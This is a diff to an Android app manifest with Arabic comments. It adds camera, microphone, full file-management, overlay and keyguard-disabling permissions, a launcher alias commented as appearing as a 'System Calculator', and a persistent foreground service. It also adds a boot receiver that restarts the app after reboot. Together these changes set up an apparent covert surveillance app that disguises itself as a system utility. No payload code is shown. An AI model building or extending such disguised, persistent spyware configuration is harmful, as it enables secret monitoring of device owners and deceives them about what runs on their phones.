@@ -2,15 +2,21 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- الأذونات الأساسية -->
+    <!-- ============================================================
+         الأذونات الأساسية
+    ============================================================ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- أذونات الوسائط (Android 13+) -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+
+    <!-- أذونات التخزين القديمة (للتوافق مع الإصدارات الأقدم) -->
     <uses-permission
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
@@ -19,14 +25,30 @@
         android:maxSdkVersion="28"
         tools:ignore="ScopedStorage" />
 
-    <!-- أذونات الخدمات الأمامية والإشعارات (لأندرويد 10+) -->
+    <!-- ============================================================
+         أذونات الخدمات الأمامية والإشعارات (لأندرويد 10+)
+    ============================================================ -->
+    <!-- ✅ مطلوب لأندرويد 13+ لإظهار الإشعارات -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- ✅ مطلوب لأندرويد 14+ لتشغيل الخدمة في الخلفية -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+
+    <!-- أذونات إدارة الطاقة والتشغيل -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- ✅ أذونات إضافية للتوافق مع أجهزة شاومي وهواوي -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+
+    <!-- ✅ صلاحية إدارة الملفات الكاملة (لأندرويد 11+) -->
+    <uses-permission
+        android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
 
     <application
         android:allowBackup="false"
@@ -43,7 +65,9 @@
         tools:ignore="GoogleAppIndexingWarning"
         tools:targetApi="34">
 
-        <!-- Alias الوهمي للنشاط -->
+        <!-- ============================================================
+             ✅ Alias الوهمي للنشاط (يظهر كـ "System Calculator")
+        ============================================================ -->
         <activity-alias
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
@@ -57,7 +81,9 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- النشاط الرئيسي -->
+        <!-- ============================================================
+             ✅ النشاط الرئيسي (شاشة السجل التشخيصي)
+        ============================================================ -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -67,20 +93,26 @@
             android:taskAffinity=""
             android:allowTaskReparenting="false" />
 
-        <!-- الخدمة الأمامية -->
+        <!-- ============================================================
+             ✅ الخدمة الأمامية مع نوع dataSync (مطلوب لأندرويد 14)
+        ============================================================ -->
         <service
             android:name=".ForegroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
 
-        <!-- مستقبل الإقلاع -->
+        <!-- ============================================================
+             ✅ مستقبل الإقلاع (تشغيل تلقائي بعد إعادة التشغيل)
+        ============================================================ -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
